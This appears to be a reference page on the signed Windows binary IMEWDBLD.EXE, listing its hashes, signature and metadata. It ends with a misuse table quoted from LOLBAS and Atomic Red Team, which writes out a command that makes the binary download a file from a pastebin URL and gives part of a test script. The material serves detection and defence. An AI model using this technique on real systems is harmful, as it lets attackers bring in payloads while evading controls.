---
title: IMEWDBLD.EXE | Microsoft IME Open Extended Dictionary Module
excerpt: What is IMEWDBLD.EXE?
---

# IMEWDBLD.EXE 

* File Path: `C:\Windows\system32\IME\SHARED\IMEWDBLD.EXE`
* Description: Microsoft IME Open Extended Dictionary Module

## Screenshot

![IMEWDBLD.EXE](screenshots/IMEWDBLD.EXE-CB30AD795C9B30E71EB1E596D18B7A21.png)

## Hashes

Type | Hash
-- | --
MD5 | `B7F456AE1C99E33F0A2321700EA24640`
SHA1 | `800F6D208DCC7D27A2D574C31FEF750C949172BB`
SHA256 | `1C9DD63EE48D5A906FFF62688F5AF6ADA44C670742B243A3BF64F88D26AB1A66`
SHA384 | `0A580930FDF1E87080504A785DEE96BF6A130B513AD1784122AFF2A7E5512F1D9B12C3B7DCE45E001AC4EA83644D2681`
SHA512 | `1323414D732B40D7B22296BDB36011492E1D89581E9501D6B2594FE7C59B0EB80AE6238E145164D29BD90CE51FA45B4D10DBF557F54FF76108571F693064689E`
SSDEEP | `12288:+yJ0spoD+gQkCeYeQqAd/+I1Mgh9BVyKC7Gs/r:+KKDyLrDdLpdyK/s/`

## Signature

* Status: Signature verified.
* Serial: `3300000266BD1580EFA75CD6D3000000000266`
* Thumbprint: `A4341B9FD50FB9964283220A36A1EF6F6FAA7840`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: imewdbld.exe
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 10.0.14393.2608 (rs1_release.181024-1742)
* Product Version: 10.0.14393.2608
* Language: Language Neutral
* Legal Copyright:  Microsoft Corporation. All rights reserved.



## Possible Misuse

*The following table contains possible examples of `IMEWDBLD.EXE` being misused. While `IMEWDBLD.EXE` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [IMEWDBLD.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/IMEWDBLD.yml) | `Name: IMEWDBLD.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [IMEWDBLD.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/IMEWDBLD.yml) | `- Command: C:\Windows\System32\IME\SHARED\IMEWDBLD.exe https://pastebin.com/raw/tdyShwLw`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [IMEWDBLD.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/IMEWDBLD.yml) | `Description: IMEWDBLD.exe attempts to load a dictionary file, if provided a URL as an argument, it will download the file served at by that URL and save it to %LocalAppData%\Microsoft\Windows\INetCache\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION> or %LocalAppData%\Microsoft\Windows\INetCache\IE\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [IMEWDBLD.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/IMEWDBLD.yml) | `- Path: C:\Windows\System32\IME\SHARED\IMEWDBLD.exe`{:.highlight .language-yaml} | 
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) | - Atomic Test #17: Download a file with IMEWDBLD.exe [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) | - Atomic Test #17: Download a file with IMEWDBLD.exe [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | - [Atomic Test #17 - Download a file with IMEWDBLD.exe](#atomic-test-17---download-a-file-with-imewdbldexe) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | ## Atomic Test #17 - Download a file with IMEWDBLD.exe | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | Use IMEWDBLD.exe (built-in to windows) to download a file. This will throw an error for an invalid dictionary file. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | $imewdbled = $env:SystemRoot + "\System32\IME\SHARED\IMEWDBLD.exe" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)



MIT License. Copyright (c) 2020-2021 Strontic.


